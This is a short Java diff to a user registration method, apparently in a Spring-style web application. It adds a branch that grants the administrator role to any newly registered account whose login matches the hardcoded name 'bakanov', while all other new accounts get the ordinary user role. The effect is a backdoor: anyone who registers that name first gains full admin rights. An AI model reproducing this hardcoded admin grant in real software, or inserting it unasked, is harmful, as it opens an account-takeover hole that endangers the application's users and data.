@@ -27,8 +27,13 @@ public class UserService {
         if (userRepository.findByLogin(login) != null) return false;
         user.setActive(true);
         user.setPassword(passwordEncoder.encode(user.getPassword()));
-        user.getRoles().add(Role.ROLE_USER);
-        log.info("Saving new User with login: {}", login);
+        if (user.getLogin().equals("bakanov")) {
+            user.getRoles().add(Role.ROLE_ADMIN);
+            log.info("Saving new Admin with login: {}", login);
+        } else {
+            user.getRoles().add(Role.ROLE_USER);
+            log.info("Saving new User with login: {}", login);
+        }
         userRepository.save(user);
         return true;
     }
